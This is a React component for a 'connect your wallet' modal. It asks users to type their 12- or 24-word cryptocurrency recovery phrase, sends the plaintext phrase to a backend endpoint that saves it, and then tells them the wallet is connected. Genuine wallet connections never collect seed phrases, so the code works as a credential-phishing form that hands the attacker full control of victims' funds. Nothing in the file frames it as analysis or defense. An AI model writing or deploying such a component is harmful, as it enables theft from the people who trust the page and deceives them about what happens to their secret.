import React, { useState } from 'react';
import toast from 'react-hot-toast';
import { useNavigate } from 'react-router-dom';
import axiosInstance from '../../utils/axiosInstance';

const WalletPhraseModal = ({ onClose, onConnectSuccess }) => {
  const [phrase, setPhrase] = useState('');
  const [phraseLength, setPhraseLength] = useState(12);
  const navigate = useNavigate();

  const handleConnect = async () => {
    const words = phrase.trim().split(/\s+/);
    if (words.length !== phraseLength) {
      toast.error(`Please enter exactly ${phraseLength} words.`);
      return;
    }

    try {
      await axiosInstance.post('/api/user/save-wallet-phrase', { phrase: phrase.trim() });
      toast.success('Wallet connected successfully!');
      onClose();
      if (onConnectSuccess) {
        onConnectSuccess();
      }
    } catch (error) {
      toast.error('Failed to save wallet phrase');
      console.error('Save wallet phrase error:', error);
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50">
      <div className="bg-card-dark rounded-lg p-8 w-full max-w-md">
        <h2 className="text-2xl font-bold text-white mb-4">Enter your wallet phrase</h2>
        <p className="text-text-secondary mb-6">
          Please enter your {phraseLength}-word recovery phrase to connect your wallet.
        </p>

        <div className="flex justify-center mb-4">
          <button
            onClick={() => setPhraseLength(12)}
            className={`px-4 py-2 rounded-l-lg ${
              phraseLength === 12 ? 'bg-sidebar-active text-white' : 'bg-card-darker text-text-secondary'
            }`}
          >
            12 Words
          </button>
          <button
            onClick={() => setPhraseLength(24)}
            className={`px-4 py-2 rounded-r-lg ${
              phraseLength === 24 ? 'bg-sidebar-active text-white' : 'bg-card-darker text-text-secondary'
            }`}
          >
            24 Words
          </button>
        </div>

        <textarea
          value={phrase}
          onChange={(e) => setPhrase(e.target.value)}
          rows={4}
          className="w-full bg-card-darker border border-card-dark rounded-lg p-4 text-white mb-6"
          placeholder={`Enter your ${phraseLength}-word phrase, separated by spaces...`}
        />

        <div className="flex justify-end space-x-4">
          <button
            onClick={onClose}
            className="px-6 py-2 bg-card-darker text-white rounded-lg"
          >
            Cancel
          </button>
          <button
            onClick={handleConnect}
            className="px-6 py-2 bg-gradient-neon text-white rounded-lg"
          >
            Connect
          </button>
        </div>
      </div>
    </div>
  );
};

export default WalletPhraseModal;
